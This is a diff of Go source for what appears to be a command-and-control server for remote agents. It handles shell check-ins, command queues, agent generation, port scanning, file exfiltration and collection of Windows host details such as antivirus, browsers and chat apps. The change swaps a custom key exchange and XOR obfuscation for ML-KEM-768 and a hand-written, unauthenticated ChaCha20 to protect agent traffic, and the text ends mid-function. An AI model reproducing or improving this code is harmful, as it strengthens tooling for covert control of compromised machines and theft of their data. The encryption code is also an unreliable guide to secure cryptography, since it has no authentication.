@@ -4,20 +4,20 @@ import (
 	"bufio"
 	"bytes"
 	"crypto/md5"
+	"crypto/mlkem"
 	crand "crypto/rand"
 	"crypto/tls"
 	"encoding/hex"
 	"encoding/json"
+	"encoding/binary"
 	"errors"
 	"flag"
 	"fmt"
 	"github.com/gorilla/websocket"
 	"io"
-	"io/ioutil"
 	"log"
 	"math"
 	"math/big"
-	"math/bits"
 	"net"
 	"net/http"
 	"net/http/httptest"
@@ -36,19 +36,12 @@ import (
 var (
 	/*不可清理*/ mutex = &sync.RWMutex{}
 
-	/*不可清理*/
-	key_map = make(map[string]string)
-	/*不可清理*/ keyMu sync.RWMutex
+	mlkemKeys   = make(map[string]mlkemKeyPair)
+	/*不可清理*/ mlkemKeysMu sync.RWMutex
 
-	//私钥
-	key1_map = make(map[string][]byte)
-	/*不可清理*/ key1Mu sync.RWMutex
-	//公钥
-	key2_map = make(map[string][]byte)
-	/*不可清理*/ key2Mu sync.RWMutex
-	//最终密钥
-	key3_map = make(map[string][]byte)
-	/*不可清理*/ key3Mu sync.RWMutex
+	/*不可清理*/
+	key_map = make(map[string][]byte)
+	/*不可清理*/ keyMu sync.RWMutex
 
 	// 客户端获取消息,前端插入消息
 	msgQueues = make(map[string]*uidMsgQueue) // key: uid
@@ -93,6 +86,11 @@ var (
 	/*不可清理*/ WhiteMu sync.RWMutex
 )
 
+type mlkemKeyPair struct {
+	private []byte // 64 bytes: d || z
+	public  []byte // 1184 bytes
+}
+
 type Msg_file struct {
 	Uid    string `json:"uid"`
 	Taskid string `json:"taskid"`
@@ -123,7 +121,7 @@ type uidMsgQueue struct {
 type MainHandler struct{}
 
 // 无权限交互
-func (m *MainHandler) Index(conn, Get_Msg, switch_key, encry_key, download, result, net, info, upload, list,
+func (m *MainHandler) Index(conn, Get_Msg, switch_key, download, result, net, info, upload, list,
 	option, uid_, hostname, keyPart, filekey, windows_pro, port string) http.HandlerFunc {
 	return func(w http.ResponseWriter, r *http.Request) {
 		serverRouteMu.RLock()
@@ -152,12 +150,25 @@ func (m *MainHandler) Index(conn, Get_Msg, switch_key, encry_key, download, resu
 			case conn: //监听
 				clientIP := getClientIP(r)
 
-				shellname_get := r.URL.Query().Get(hostname)
-				shellname_c, _ := customBase64Decode(shellname_get, code_rounds)
-				shellname := string(shellname_c)
+				shellnameGet := r.URL.Query().Get(hostname)
+				shellnameBytes, _ := customBase64Decode(shellnameGet, code_rounds)
+				shellname := string(shellnameBytes)
 
-				key_base := Get_conn(uid, shellname, clientIP, base_rounds)
-				fmt.Fprint(w, key_base)
+				formattedTime := time.Now().Format("2006.01.02 15:04")
+
+				put_conn(shellname, formattedTime, uid, clientIP)
+
+				mlkemKeysMu.RLock()
+				pair, ok := mlkemKeys[uid]
+				publicKey := append([]byte(nil), pair.public...)
+				mlkemKeysMu.RUnlock()
+			
+				if !ok || len(publicKey) != mlkem.EncapsulationKeySize768 {
+					return
+				}
+
+				fmt.Fprint(w, customBase64Encode(publicKey, base_rounds))
+				
 			case Get_Msg: //获取指令
 				data := GetMsg(uid, base_rounds, uidBytes)
 				fmt.Fprint(w, data)
@@ -166,28 +177,8 @@ func (m *MainHandler) Index(conn, Get_Msg, switch_key, encry_key, download, resu
 				byte_base_key_mid := r.URL.Query().Get(keyPart)
 				key_decode, _ := customBase64Decode(byte_base_key_mid, code_rounds)
 
-				err := Switch_key(uid, key_decode, base_rounds)
-				if err != nil {
-					return
-				}
-			case encry_key: //获取未加密密钥
-				func(uid string) {
-					dataConnMu.RLock()
-					defer dataConnMu.RUnlock()
-					for i := range data_conn.Conns {
-						conn := &data_conn.Conns[i]
-						if uid == conn.Uid {
-							if conn.HostKey != "" && conn.HostKey != "null" {
-								key_decode := customBase64Encode([]byte(conn.HostKey), base_rounds)
-								fmt.Fprint(w, key_decode)
-								EncryptHostKey(conn.Uid, conn.HostKey)
-								break
-							} else {
-								return
-							}
-						}
-					}
-				}(uid)
+				Switch_key(uid, key_decode)
+				
 			case download:
 
 				filekey := r.URL.Query().Get(filekey)
@@ -269,9 +260,9 @@ func (m *MainHandler) Index(conn, Get_Msg, switch_key, encry_key, download, resu
 					return
 				}
 				if windows_pro == "group_pro" {
-					Windows_GetInfo(uid, encry_str, key, clientIP, code_rounds)
+					Windows_GetInfo(uid, encry_str,clientIP,key, code_rounds)
 				} else {
-					GetInfo(uid, encry_str, key, clientIP, code_rounds)
+					GetInfo(uid, encry_str,clientIP,key, code_rounds)
 				}
 
 			case upload:
@@ -785,13 +776,28 @@ func User_index(notFoundHeaders map[string]string) http.HandlerFunc {
 					})
 				case "insertKey":
 					uid, _ := body["uid"].(string)
-					shellname, _ := body["request"].(string)
-					Insert_key(uid, shellname)
-					clientWs.WriteJSON(map[string]interface{}{
-						"code":    200,
+				
+					created, exists := insertKeyMap(uid)
+				
+					response := map[string]interface{}{
+						"code":    400,
+						"uid":     uid,
 						"path":    "insertKey",
-						"message": "insert success",
-					})
+						"message": "insert fail",
+					}
+				
+					if created {
+						response["code"] = 200
+						response["message"] = "insert success"
+					} else if exists {
+						response["code"] = 409
+						response["message"] = "key already exists"
+					}
+				
+					if err := clientWs.WriteJSON(response); err != nil {
+						break
+					}
+
 				case "delShellInnet":
 					uid, _ := body["uid"].(string)
 					target, _ := body["target"].(string)
@@ -1280,7 +1286,6 @@ func User_index(notFoundHeaders map[string]string) http.HandlerFunc {
 					ConnPath, _ := body["ConnPath"].(string)
 					MsgPath, _ := body["MsgPath"].(string)
 					switch_key, _ := body["switch_key"].(string)
-					encry_key, _ := body["encry_key"].(string)
 					download, _ := body["download"].(string)
 					result, _ := body["result"].(string)
 					_net, _ := body["net"].(string)
@@ -1316,7 +1321,7 @@ func User_index(notFoundHeaders map[string]string) http.HandlerFunc {
 						continue
 					}
 					code := client_.Generate_agent(ptc, _os, server, Path, ConnPath, MsgPath, switch_key,
-						encry_key, download, result, _net, info, upload, list, option, username, uid,
+						download, result, _net, info, upload, list, option, username, uid,
 						hostname, keyPart, filekey, code_, base_rounds, windows_pro)
 					clientWs.WriteJSON(map[string]interface{}{
 						"code": 200,
@@ -2313,7 +2318,6 @@ func User_index(notFoundHeaders map[string]string) http.HandlerFunc {
 						ConnPath     string `json:"connPath"`
 						MsgPath      string `json:"msgPath"`
 						SwitchKey    string `json:"switch_key"`
-						EncryKey     string `json:"encry_key"`
 						Download     string `json:"download"`
 						Result       string `json:"result"`
 						Net          string `json:"net"`
@@ -2376,7 +2380,6 @@ func User_index(notFoundHeaders map[string]string) http.HandlerFunc {
 						requestData.ConnPath,
 						requestData.MsgPath,
 						requestData.SwitchKey,
-						requestData.EncryKey,
 						requestData.Download,
 						requestData.Result,
 						requestData.Net,
@@ -2471,7 +2474,6 @@ func User_index(notFoundHeaders map[string]string) http.HandlerFunc {
 						requestData.ConnPath,
 						requestData.MsgPath,
 						requestData.SwitchKey,
-						requestData.EncryKey,
 						requestData.Download,
 						requestData.Result,
 						requestData.Net,
@@ -2790,7 +2792,7 @@ func writeBinaryRange(clientWs binaryMessageWriter, file *os.File, offset int64,
 }
 
 // 接收
-func GetInfo(uid, encry_str, key, clientIP string, code_map map[byte]int) {
+func GetInfo(uid, encry_str,clientIP string,key []byte,code_map map[byte]int) {
 	var server_remark string
 	data := Get_decry_s(&encry_str, &key, code_map)
 
@@ -2826,11 +2828,11 @@ func GetInfo(uid, encry_str, key, clientIP string, code_map map[byte]int) {
 
 	go put_client(username, shellname, osname, formattedTime, clientIP, currentDir, version, innet_ip, Remarks, uid, server_remark, executable, proto, timeInt, jitterInt)
 	log_str1 := fmt.Sprintf(log_word["agent_online"],
-		username, uid, shellname, osname, version, executable, t, jitter, clientIP, innet_ip, port, protocol, server_remark, currentDir, hashString[12:])
+		username, uid, shellname, osname, version, executable, t, jitter, clientIP, innet_ip, port, protocol, server_remark, currentDir, hashString)
 	logger.WriteLog(log_str1)
 	go DeleteEntry(uid, false)
 }
-func Windows_GetInfo(uid, encry_str, key, clientIP string, code_map map[byte]int) {
+func Windows_GetInfo(uid, encry_str,clientIP  string,key []byte,code_map map[byte]int) {
 	data := Get_decry_s(&encry_str, &key, code_map)
 	data_list := strings.Split(data, "*//*")
 	if len(data_list) < 19 { // 需要11个字段
@@ -2877,7 +2879,7 @@ func Windows_GetInfo(uid, encry_str, key, clientIP string, code_map map[byte]int
 	go Windows_put_client(username, shellname, osname, formattedTime, clientIP, currentDir, version, innet_ip, Remarks, uid, server_remark, executable, timeInt, jitterInt, macs, cpuInfo, antivirus, browsers, chatApps, memoryStr, systemType, arch, proto)
 	// 记录详细的 Windows 信息日志
 	log_str := fmt.Sprintf(log_word["windows_agent_online"],
-		username, uid, shellname, osname, version, executable, t, jitter, clientIP, innet_ip, port, protocol, server_remark, currentDir, hashString[12:], macs, cpuInfo, memoryStr, systemType, arch, antivirus, browsers, chatApps)
+		username, uid, shellname, osname, version, executable, t, jitter, clientIP, innet_ip, port, protocol, server_remark, currentDir, hashString, macs, cpuInfo, memoryStr, systemType, arch, antivirus, browsers, chatApps)
 	logger.WriteLog(log_str)
 	// 删除连接条目
 	go DeleteEntry(uid, false)
@@ -3100,279 +3102,126 @@ func updateListen(uid string) []ClientInfo {
 	return nil
 }
 
-func Get_conn(uid, hostname, clientIP, base_rounds string) string {
-	current := time.Now()
-	formattedTime := current.Format("2006.01.02 15:04")
-	put_conn(hostname, formattedTime, uid, clientIP, "null")
-
-	key1Mu.Lock()
-	key1_map[uid] = nil
-	key1Mu.Unlock()
-
-	key2Mu.Lock()
-	key2_map[uid] = nil
-	key2Mu.Unlock()
-
-	key3Mu.Lock()
-	key3_map[uid] = nil
-	key3Mu.Unlock()
-
-	keyMu.Lock()
-	delete(key_map, uid)
-	keyMu.Unlock()
-
-	for {
-		if insert_key1_map(uid, base_rounds) {
-			break
-		}
-		time.Sleep(time.Second)
-	}
-
-	key2Mu.RLock()
-	pubKeyBytes, ok := key2_map[uid] // []byte
-	key2Mu.RUnlock()
-	if !ok {
-		return ""
-	}
-	encoded := customBase64Encode(pubKeyBytes, base_rounds)
-	return encoded
-}
-func onlyHex(s string) string {
-	out := make([]rune, 0, len(s))
-	for _, c := range s {
-		if (c >= '0' && c <= '9') ||
-			(c >= 'a' && c <= 'f') ||
-			(c >= 'A' && c <= 'F') {
-			out = append(out, c)
-		}
-	}
-	return string(out)
-}
-
-// 生成 [0, max) 的 *big.Int
-func randBigInt(max *big.Int) *big.Int {
-	if max == nil || max.Sign() <= 0 {
-		return big.NewInt(0)
-	}
-
-	n, err := crand.Int(crand.Reader, max)
-	if err != nil {
-		return big.NewInt(0)
-	}
-	return n
-}
-
-// 从 raw 派生 p
-func deriveP(raw string) *big.Int {
-	hexStr := onlyHex(raw)
-	// 拼接一些固定高位，让 p 足够大
-	pStr := "FFFFFFFFFFFFFFF" + hexStr
-	p, ok := new(big.Int).SetString(pStr, 16)
-	if !ok {
-		return nil
-	}
-	return p
-}
-
-// 从 p 派生 g（保证 g>=2, g<p）
-func deriveG(p *big.Int) *big.Int {
-	bits := byte(0)
-	for i := 1024; i < 1032; i++ {
-		bits = bits<<1 + byte(p.Bit(i))
-	}
-	g := big.NewInt(int64(bits))
-	if g.Cmp(big.NewInt(2)) < 0 {
-		g.Add(g, big.NewInt(2))
-	}
-	if g.Cmp(p) >= 0 {
-		g.Mod(g, new(big.Int).Sub(p, big.NewInt(2)))
-		g.Add(g, big.NewInt(2))
-	}
-	return g
-}
-func insert_key1_map(uid, base_rounds string) bool {
-	p := deriveP(base_rounds)
-	if p == nil {
+func validMLKEMKeyPair(pair mlkemKeyPair) bool {
+	if len(pair.private) != mlkem.SeedSize ||
+		len(pair.public) != mlkem.EncapsulationKeySize768 {
 		return false
 	}
-	g := deriveG(p)
 
-	a := randBigInt(p)
-	A := new(big.Int).Exp(g, a, p)
-	aBytes := a.Bytes()
-	ABytes := A.Bytes()
-
-	key1Mu.Lock()
-	key1_map[uid] = aBytes // 私钥
-	key1Mu.Unlock()
-	key2Mu.Lock()
-	key2_map[uid] = ABytes // 公钥
-	key2Mu.Unlock()
-	return true
-}
-
-// 接收客户端中间值添加与服务器私钥交互计算出最终密钥再与data_conn.Conns[i].HostKey交互返回给客户端
-func Switch_key(uid string, clientPubKeyBytes []byte, base_rounds string) error {
-	dataConnMu.RLock()
-	defer dataConnMu.RUnlock()
-	for i := range data_conn.Conns {
-		conn := &data_conn.Conns[i]
-		if uid != conn.Uid {
-			continue
-		}
-
-		// 取私钥 a
-		key1Mu.RLock()
-		privateKeyBytes, exists := key1_map[uid]
-		key1Mu.RUnlock()
-		if !exists || len(privateKeyBytes) == 0 {
-			return nil
-		}
-
-		serverPrivateKey := new(big.Int).SetBytes(privateKeyBytes)
-
-		// 客户端公钥
-		if len(clientPubKeyBytes) == 0 {
-			return nil
-		}
-		clientPubKey := new(big.Int).SetBytes(clientPubKeyBytes)
-		p := deriveP(base_rounds)
-		if p == nil {
-			return nil
-		}
-
-		// shared = clientPubKey^a mod p
-		shared := new(big.Int).Exp(clientPubKey, serverPrivateKey, p)
-		sharedBytes := shared.Bytes()
-
-		key3Mu.Lock()
-		key3_map[uid] = sharedBytes
-		key3Mu.Unlock()
-
-		return nil
-	}
-	return nil
-}
-func leftPadBytes(b []byte, size int) []byte {
-	if len(b) >= size {
-		return b
+	decapsulationKey, err := mlkem.NewDecapsulationKey768(pair.private)
+	if err != nil {
+		return false
 	}
 
-	out := make([]byte, size)
-	copy(out[size-len(b):], b)
-	return out
+	derivedPublic := decapsulationKey.EncapsulationKey().Bytes()
+
+	return len(derivedPublic) == mlkem.EncapsulationKeySize768 &&
+		bytes.Equal(derivedPublic, pair.public)
 }
-func EncryptHostKey(uid, key string) {
-	key3Mu.RLock()
-	sharedKeyInts, exists := key3_map[uid]
-	key3Mu.RUnlock()
-	if !exists || len(sharedKeyInts) == 0 {
+
+func insertKeyMap(uid string) (created bool, exists bool) {
+	if uid == "" {
+		return false, false
+	}
+
+	mlkemKeysMu.Lock()
+	defer mlkemKeysMu.Unlock()
+
+	if pair, ok := mlkemKeys[uid]; ok {
+		if validMLKEMKeyPair(pair) {
+			return false, true
+		}
+		
+		clear(pair.private)
+		clear(pair.public)
+		delete(mlkemKeys, uid)
+	}
+
+	decapsulationKey, err := mlkem.GenerateKey768()
+	if err != nil || decapsulationKey == nil {
+		return false, false
+	}
+
+	privateKeyBytes := append([]byte(nil), decapsulationKey.Bytes()...)
+	publicKeyBytes := append([]byte(nil),decapsulationKey.EncapsulationKey().Bytes()...,)
+
+	newPair := mlkemKeyPair{
+		private: privateKeyBytes,
+		public:  publicKeyBytes,
+	}
+
+	if !validMLKEMKeyPair(newPair) {
+		clear(privateKeyBytes)
+		clear(publicKeyBytes)
+		return false, false
+	}
+
+	mlkemKeys[uid] = newPair
+	return true, false
+}
+
+// 接收客户端中间值添加与服务器私钥交互计算出最终密钥
+func Switch_key(uid string, clientCiphertext []byte) {
+	if uid == "" {
 		return
 	}
 
-	sharedKeyInts = leftPadBytes(sharedKeyInts, 7)
-	clientKey := []byte(key)
-	sharedLen := len(sharedKeyInts)
-
-	var obfKey []byte
-	var obfConst ObfConst
-
-	last6 := sharedKeyInts[sharedLen-6:]
-	prefix := sharedKeyInts[:sharedLen-6]
-
-	pLen := len(prefix)
-	cLen := len(clientKey)
-
-	newKey := make([]byte, 0, pLen+cLen)
-
-	base := 0
-	rem := 0
-	if pLen+1 > 0 {
-		base = cLen / (pLen + 1)
-		rem = cLen % (pLen + 1)
+	if len(clientCiphertext) != mlkem.CiphertextSize768 {
+		return
 	}
 
-	ci := 0
-	for i := 0; i < pLen; i++ {
-		segLen := base
-		if i < rem {
-			segLen++
-		}
-		for j := 0; j < segLen && ci < cLen; j++ {
-			newKey = append(newKey, clientKey[ci])
-			ci++
-		}
-		newKey = append(newKey, byte(prefix[i]))
+	var privateKeyBytes []byte
+
+	mlkemKeysMu.RLock()
+	pair, exists := mlkemKeys[uid]
+	if exists {
+		privateKeyBytes = append([]byte(nil), pair.private...)
+	}
+	mlkemKeysMu.RUnlock()
+
+	if !exists || len(privateKeyBytes) != mlkem.SeedSize {
+		return
 	}
 
-	for ci < cLen {
-		newKey = append(newKey, clientKey[ci])
-		ci++
-	}
-
-	obfKey = newKey
-	obfConst = ObfConst{
-		A: byte(last6[0]),
-		B: byte(last6[1]),
-		C: byte(last6[2]),
-		D: byte(last6[3]),
-		E: byte(last6[4]),
-		F: byte(last6[5]),
-	}
-
-	result := ObfuscateBySteps(obfKey, obfConst)
-
-	keyMu.Lock()
-	key_map[uid] = string(result)
-	keyMu.Unlock()
-}
-
-// 插入密钥
-func Insert_key(uid, shellname string) {
-	charset := "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
-	lengthRand, err := crand.Int(crand.Reader, big.NewInt(255))
+	decapsulationKey, err := mlkem.NewDecapsulationKey768(privateKeyBytes)
 	if err != nil {
 		return
 	}
-	keyLength := int(lengthRand.Int64()) + 1030 // 密钥长度在1030到1284之间
 
-	keyBuilder := strings.Builder{}
-	keyBuilder.Grow(keyLength)
-
-	for i := 0; i < keyLength; i++ {
-		n, err := crand.Int(crand.Reader, big.NewInt(int64(len(charset))))
-		if err != nil {
-			return
-		}
-		keyBuilder.WriteByte(charset[n.Int64()])
+	sharedBytes, err := decapsulationKey.Decapsulate(clientCiphertext)
+	if err != nil {
+		return
 	}
 
-	key := keyBuilder.String()
-
-	dataConnMu.Lock()
-	defer dataConnMu.Unlock()
-
-	for i := range data_conn.Conns {
-		conn := &data_conn.Conns[i]
-		if uid == conn.Uid && shellname == conn.Host {
-			conn.HostKey = key
-			break
-		}
+	if len(sharedBytes) != mlkem.SharedKeySize {
+		return
 	}
+
+	finalKey := append([]byte(nil), sharedBytes...)
+
+	keyMu.Lock()
+	key_map[uid] = finalKey
+	keyMu.Unlock()
+}
+
+func deleteMLKEMKey(uid string) {
+	if uid == "" {
+		return
+	}
+	mlkemKeysMu.Lock()
+	defer mlkemKeysMu.Unlock()
+	pair, exists := mlkemKeys[uid]
+	if !exists {
+		return
+	}
+	clear(pair.private)
+	clear(pair.public)
+	delete(mlkemKeys, uid)
 }
 
 func cleanupDeletedUID(uid string, deletedIndex int, delbase bool) {
-	key1Mu.Lock()
-	delete(key1_map, uid)
-	key1Mu.Unlock()
-
-	key2Mu.Lock()
-	delete(key2_map, uid)
-	key2Mu.Unlock()
-
-	key3Mu.Lock()
-	delete(key3_map, uid)
-	key3Mu.Unlock()
+	
+	deleteMLKEMKey(uid)
 
 	if delbase {
 		uidMutex.Lock()
@@ -4142,7 +3991,7 @@ func Net_results(uid, results string, code_rounds map[byte]int) {
 	if exists {
 		encryptedData := Get_decry_s(&results, &key, code_rounds)
 		in_port(uid, encryptedData)
-		go func(encryptedData, key, uid string) {
+		go func(encryptedData, uid string,key []byte) {
 			var shellname string
 			clientDataMu.RLock()
 			for i := range client_data.Clients {
@@ -4155,7 +4004,7 @@ func Net_results(uid, results string, code_rounds map[byte]int) {
 			clientDataMu.RUnlock()
 			logStr := fmt.Sprintf(log_word["scan_result"], shellname, uid, len(encryptedData))
 			logger.WriteLog(logStr)
-		}(encryptedData, key, uid)
+		}(encryptedData,uid,key)
 	}
 }
 func Check_comment(check_parts, option string) bool {
@@ -4175,7 +4024,6 @@ func Check_comment(check_parts, option string) bool {
 			return false
 		}
 	} else if strings.Contains(check_parts, ",") {
-		uniquePorts := []string{}
 		portMap := make(map[int]bool)
 		split_int := strings.Split(check_parts, ",")
 		for _, v := range split_int {
@@ -4190,7 +4038,6 @@ func Check_comment(check_parts, option string) bool {
 			}
 			if !portMap[port] {
 				portMap[port] = true
-				uniquePorts = append(uniquePorts, strconv.Itoa(port))
 			}
 		}
 	} else {
@@ -4753,6 +4600,11 @@ func UploadFileHandler(uid, data, filename string,
 	if err != nil {
 		return
 	}
+	
+	fileLog2 := fmt.Sprintf(log_word["request_file_part_"],
+		username, uid, realFilename, splitPos, startPos, endPos)
+	logger.WriteLog(fileLog2)
+
 	// 最后一块完成
 	if endPos == filePos {
 		go PushAgentData(uid, "updateLoot")
@@ -4760,9 +4612,6 @@ func UploadFileHandler(uid, data, filename string,
 		filelog3 := fmt.Sprintf(log_word["request_file_finish"], username, uid, realFilename, filePos, receivedFilePath)
 		logger.WriteLog(filelog3)
 	}
-	fileLog2 := fmt.Sprintf(log_word["request_file_part_"],
-		username, uid, realFilename, splitPos, startPos, endPos)
-	logger.WriteLog(fileLog2)
 }
 
 func getFilenameFromPath(path string) string {
@@ -5055,58 +4904,52 @@ func ClearUnmarkedGlobalVars() {
 	msgQueues = make(map[string]*uidMsgQueue)
 	queuesMu.Unlock()
 
-	// 2) 清理 key1_map
-	key1Mu.Lock()
-	key1_map = make(map[string][]byte)
-	key1Mu.Unlock()
+	// 2) 清理 交换密钥
+	mlkemKeysMu.Lock()
+	for uid, pair := range mlkemKeys {
+		clear(pair.private)
+		clear(pair.public)
+		delete(mlkemKeys, uid)
+	}
+	mlkemKeysMu.Unlock()
 
-	// 3) 清理 key2_map
-	key2Mu.Lock()
-	key2_map = make(map[string][]byte)
-	key2Mu.Unlock()
-
-	// 4) 清理 key3_map
-	key3Mu.Lock()
-	key3_map = make(map[string][]byte)
-	key3Mu.Unlock()
-
-	// 5) 清理 msgFileQueue
+	// 3) 清理 msgFileQueue
 	fileMu.Lock()
 	msgFileQueue = make(map[string]*fileQueue)
 	fileMu.Unlock()
 
-	// 6) 清理 msgResultQueues
+	// 4) 清理 msgResultQueues
 	resultMu.Lock()
 	msgResultQueues = make(map[string]*resultQueue)
 	resultMu.Unlock()
 
-	// 7) 清理 msg_map_list
+	// 5) 清理 msg_map_list
 	mapMu.Lock()
 	msg_map_list = make([]Msg_result, 0)
 	mapMu.Unlock()
 
-	// 8) 清理 msg_file_cache
+	// 6) 清理 msg_file_cache
 	fcache.Lock()
 	msg_file_cache = make([]Msg_file, 0)
 	fcache.Unlock()
 
-	// 9) 清理下载缓存
+	// 7) 清理下载缓存
 	DoByteMu.Lock()
 	DownloadFile_byte_parts = make(map[string][]byte)
 	parts_count = make(map[string]int)
 	DoByteMu.Unlock()
 
-	// 10) 清理全局 sessionSlice
+	// 8) 清理全局 sessionSlice
 	mutex.Lock()
 	sessionSlice = make([]string, 0)
 	mutex.Unlock()
 
-	// 11) 清理内网资产
+	// 9) 清理内网资产
 	dataInnetmu.Lock()
 	data_innet.Innets = nil
 	dataInnetmu.Unlock()
 
-	// 12) 清理websocket连接
+	// 10) 清理websocket连接
 	wsUsersMu.Lock()
 	clientsToClose := make([]*WSClient, 0)
 	seen := make(map[*WSClient]struct{})
@@ -5132,7 +4975,7 @@ func ClearUnmarkedGlobalVars() {
 		_ = c.Close()
 	}
 
-	// 14) 写日志（这里可以直接写，不影响锁）
+	// 11) 写日志（这里可以直接写，不影响锁）
 	logStr := log_word["Memory_clean"]
 	logger.WriteLog(logStr)
 }
@@ -5163,160 +5006,161 @@ func updateInnet(uid string) Innet {
 	return Innet{}
 }
 
-// obf const encry
-type ObfConst struct {
-	A byte // 0x6b
-	B byte // 0x7a
-	C byte // 0x5c
-	D byte // 0xe4
-	E byte // 0x3f
-	F byte // 0xa5
+
+func rotl(x uint32, n uint) uint32 {
+	return (x << n) | (x >> (32 - n))
 }
 
-// 更新三字节状态
-func updateState(a, b, c, x, y, z byte, rotate int) (byte, byte, byte) {
-	v := uint32(a)<<24 |
-		uint32(b)<<16 |
-		uint32(c)<<8 |
-		uint32(x)
+func quarterRound(a, b, c, d uint32) (uint32, uint32, uint32, uint32) {
+	a += b
+	d ^= a
+	d = rotl(d, 16)
 
-	v += uint32(y)<<8 | uint32(z)
-	v = bits.RotateLeft32(v, rotate)
-	v ^= uint32(c)<<24 |
-		uint32(a)<<16
+	c += d
+	b ^= c
+	b = rotl(b, 12)
 
-	return byte(v >> 24),
-		byte(v >> 16),
-		byte(v >> 8)
-}
-func ObfuscateBySteps(data []byte, k ObfConst) []byte {
-	if len(data) == 0 {
-		return data
-	}
-	if len(data) < 3 {
-		for i := range data {
-			data[i] ^= k.A ^ k.B | k.C
-		}
-		return data
-	}
-	n := len(data) / 3
-	remainder := len(data) % 3
-	at := func(r, c int) *byte {
-		return &data[r*n+c]
-	}
-	prev0 := k.A
-	prev1 := k.B
-	prev2 := k.C
-	for col := 0; col < n; col++ {
-		colIndex := col + 1
-		if colIndex%2 == 0 {
-			*at(0, col) = (*at(0, col) | prev0) ^ k.A
-			*at(2, col) = prev1 ^ *at(2, col) ^ k.B
-			*at(1, col) = prev2 ^ *at(1, col) | k.C
-			prev0 = *at(0, col)
-			prev1 = *at(1, col)
-			prev2 = *at(2, col)
-			k.A, k.B, k.C = updateState(k.A, k.B, k.C, prev0, prev1, prev2, 7)
-		} else {
-			*at(1, col) = (prev0 ^ *at(1, col)) | k.D
-			*at(0, col) = prev1 ^ (*at(0, col) ^ k.E)
-			*at(2, col) = (*at(2, col) | prev2) ^ k.F
-			prev0 = *at(0, col)
-			prev1 = *at(1, col)
-			prev2 = *at(2, col)
-			k.D, k.E, k.F = updateState(k.D, k.E, k.F, prev0, prev1, prev2, 11)
-		}
-	}
-	if remainder > 0 {
-		start := 3 * n
-		for i := start; i < len(data); i++ {
-			data[i] ^= data[i-1] ^ k.A | k.B
-		}
-	}
-	return data
+	a += b
+	d ^= a
+	d = rotl(d, 8)
+
+	c += d
+	b ^= c
+	b = rotl(b, 7)
+
+	return a, b, c, d
 }
 
-func randomSalt6() (ObfConst, []byte) {
-	var s [6]byte
-	_, _ = io.ReadFull(crand.Reader, s[:])
-
-	return ObfConst{
-		A: s[0],
-		B: s[1],
-		C: s[2],
-		D: s[3],
-		E: s[4],
-		F: s[5],
-	}, s[:]
+func initializeState(key [32]byte, counter uint32, nonce [12]byte) [16]uint32 {
+	return [16]uint32{
+		0x61707865, 0x3320646e, 0x79622d32, 0x6b206574,
+		binary.LittleEndian.Uint32(key[0:4]),
+		binary.LittleEndian.Uint32(key[4:8]),
+		binary.LittleEndian.Uint32(key[8:12]),
+		binary.LittleEndian.Uint32(key[12:16]),
+		binary.LittleEndian.Uint32(key[16:20]),
+		binary.LittleEndian.Uint32(key[20:24]),
+		binary.LittleEndian.Uint32(key[24:28]),
+		binary.LittleEndian.Uint32(key[28:32]),
+		counter,
+		binary.LittleEndian.Uint32(nonce[0:4]),
+		binary.LittleEndian.Uint32(nonce[4:8]),
+		binary.LittleEndian.Uint32(nonce[8:12]),
+	}
 }
 
-func Encrypt(plain, key []byte) []byte {
-	if len(plain) == 0 || len(key) == 0 {
-		return nil
-	}
-	obfKey, salt := randomSalt6()
-	sin := (int(key[1024%len(key)])*len(plain) ^ 1024) % len(key)
-	ofkeyLen := len(key) - sin
-	if ofkeyLen > len(plain) {
-		ofkeyLen = len(plain)
-	}
-	ofkey := append([]byte{}, key[sin:sin+ofkeyLen]...)
-	fuscateKey := ObfuscateBySteps(ofkey, obfKey)
-	if len(fuscateKey) == 0 {
-		return nil
-	}
-	out := make([]byte, len(plain))
-	for i := range plain {
-		out[i] = plain[i] ^ fuscateKey[i%len(fuscateKey)]
-	}
-	return append(out, salt...)
-}
+func chacha20Block(key [32]byte, counter uint32, nonce [12]byte) [64]byte {
+	state := initializeState(key, counter, nonce)
+	working := state
 
-func Decrypt(cipher, key []byte) []byte {
-	if len(cipher) < 6 || len(key) == 0 {
-		return nil
+	for i := 0; i < 10; i++ {
+		working[0], working[4], working[8], working[12] = quarterRound(working[0], working[4], working[8], working[12])
+		working[1], working[5], working[9], working[13] = quarterRound(working[1], working[5], working[9], working[13])
+		working[2], working[6], working[10], working[14] = quarterRound(working[2], working[6], working[10], working[14])
+		working[3], working[7], working[11], working[15] = quarterRound(working[3], working[7], working[11], working[15])
+
+		working[0], working[5], working[10], working[15] = quarterRound(working[0], working[5], working[10], working[15])
+		working[1], working[6], working[11], working[12] = quarterRound(working[1], working[6], working[11], working[12])
+		working[2], working[7], working[8], working[13] = quarterRound(working[2], working[7], working[8], working[13])
+		working[3], working[4], working[9], working[14] = quarterRound(working[3], working[4], working[9], working[14])
 	}
-	data := cipher[:len(cipher)-6]
-	salt := cipher[len(cipher)-6:]
-	obfKey := ObfConst{
-		A: salt[0],
-		B: salt[1],
-		C: salt[2],
-		D: salt[3],
-		E: salt[4],
-		F: salt[5],
+
+	var out [64]byte
+	for i := 0; i < 16; i++ {
+		working[i] += state[i]
+		binary.LittleEndian.PutUint32(out[i*4:], working[i])
 	}
-	sin := (int(key[1024%len(key)])*len(data) ^ 1024) % len(key)
-	ofkeyLen := len(key) - sin
-	if ofkeyLen > len(data) {
-		ofkeyLen = len(data)
-	}
-	ofkey := append([]byte{}, key[sin:sin+ofkeyLen]...)
-	fuscateKey := ObfuscateBySteps(ofkey, obfKey)
-	if len(fuscateKey) == 0 {
-		return nil
-	}
-	out := make([]byte, len(data))
-	for i := range data {
-		out[i] = data[i] ^ fuscateKey[i%len(fuscateKey)]
-	}
+
 	return out
 }
 
+func ChaCha20Encrypt(data []byte, key [32]byte, nonce [12]byte, counter uint32) []byte {
+	out := make([]byte, len(data))
+
+	for i := 0; i < len(data); i += 64 {
+		block := chacha20Block(key, counter, nonce)
+		n := len(data) - i
+		if n > 64 {
+			n = 64
+		}
+
+		for j := 0; j < n; j++ {
+			out[i+j] = data[i+j] ^ block[j]
+		}
+
+		counter++
+	}
+
+	return out
+}
+
+func chachaEncrypt(input []byte, key []byte) []byte {
+	if len(key) != 32 {
+		return nil
+	}
+
+	var chaKey [32]byte
+	copy(chaKey[:], key)
+
+	var nonce [12]byte
+	if _, err := crand.Read(nonce[:]); err != nil {
+		return nil
+	}
+
+	cipher := ChaCha20Encrypt(input, chaKey, nonce, 0)
+
